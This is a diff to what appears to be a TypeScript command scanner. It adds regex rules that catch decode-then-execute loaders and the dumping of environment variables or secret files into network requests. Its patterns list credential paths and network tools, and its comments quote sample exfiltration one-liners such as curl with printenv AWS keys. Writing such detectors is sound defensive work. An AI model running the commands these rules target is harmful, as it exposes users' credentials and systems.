@@ -66,6 +66,7 @@ const REMOTE_EXEC: RegExp[] = [
   /\bbash\s+<\s*\(\s*(curl|wget)/i, // bash <(curl …)
   /\beval\b[^\n]*\$\(\s*(curl|wget|fetch)\b/i, // eval "$(curl …)"
   /\bpython\d?\s+-c\b[^\n]*urllib|requests\.get[^\n]*exec\(/i, // python one-liner fetch+exec
+  /\b(base64\s+(-d|--decode)|xxd\s+-r|openssl\s+enc\s+-d)\b[^\n|]*\|\s*(sudo\s+)?(sh|bash|zsh|python\d?|node|perl|ruby)\b/i, // decode-then-exec (obfuscated loader)
 ];
 
 // ── Reverse shells / remote backdoors ────────────────────────────────────────
@@ -80,12 +81,15 @@ const REVERSE_SHELL: RegExp[] = [
 // ── Secret / credential exfiltration ─────────────────────────────────────────
 const SECRET_PATHS = /(\.ssh\/id_|\.ssh\/.*_rsa|\.aws\/credentials|\.oriro\/credentials|\.config\/gcloud|\.env(\.|\b)|\.netrc|id_ed25519|\.kube\/config|wallet\.dat|\.gnupg\/)/i;
 const NET_SINK = /\b(curl|wget|nc|ncat|socat|scp|rsync|ftp|tftp|invoke-webrequest|invoke-restmethod)\b/i;
-// Env-var / secret-file exfil via COMMAND SUBSTITUTION dumped into a request — e.g.
-// `curl https://x/?k=$(printenv AWS_SECRET_ACCESS_KEY)` or `wget …$(cat ~/.aws/credentials)`.
-// Scoped to `$(printenv|env|cat <secret>)` so it never fires on legit `-H "Authorization: Bearer $TOKEN"`.
+// Env-var / secret-file exfil dumped into a request — both the COMMAND-SUBSTITUTION form
+// (`curl …$(printenv AWS_SECRET…)`) AND the PIPE form (`printenv SECRET | curl`, `env | curl`).
+// The rule only fires when a NET_SINK is also present, and these are scoped to `printenv`/`env`/
+// `$(cat <secret>)` so they never fire on legit `-H "Authorization: Bearer $TOKEN"` or `env VAR=x cmd`.
 const ENV_EXFIL: RegExp[] = [
-  /\$\(\s*(printenv|env)\b/i,
-  /\$\(\s*cat\b[^)]*(\.ssh|\.aws|\.env|\.netrc|credential|secret|token|id_rsa|id_ed25519)/i,
+  /\$\(\s*(printenv|env)\b/i, // $(printenv X) / $(env) substitution
+  /\bprintenv\b/i, // printenv … (env dump — paired with a net sink below = exfil)
+  /\benv\s*\|/i, // env | … (piping the whole environment)
+  /\$\(\s*cat\b[^)]*(\.ssh|\.aws|\.env|\.netrc|credential|secret|token|id_rsa|id_ed25519)/i, // $(cat <secret>)
 ];
 
 // ── Persistence / Trojan footholds (cron, rc files, startup, services) ───────
